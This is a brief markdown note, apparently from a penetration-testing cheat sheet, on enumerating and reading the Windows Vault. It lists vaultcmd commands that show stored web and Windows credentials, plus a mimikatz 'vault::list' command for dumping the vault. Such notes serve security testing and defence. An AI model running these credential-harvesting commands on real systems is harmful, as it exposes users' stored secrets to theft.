## Windows Vault

The `Credential Manager` feature uses as the underlying storage mechanism the `Windows Vault`, which is a store capable of managing encrypted data.

While the credential manager is accessed using `cmdkey`, the windows vault instead can be accessed using `vaultcmd`.

---

Enumerate vaults:
```powershell
vaultcmd /list
```

List entries saved in vault:
```powershell
vaultcmd /listcreds:"Web Credentials" /all
```

```powershell
vaultcmd /listcreds:"Windows Credentials" /all
```

Dump vault with mimikatz:
```cmd
mimikatz.exe vault::list
```
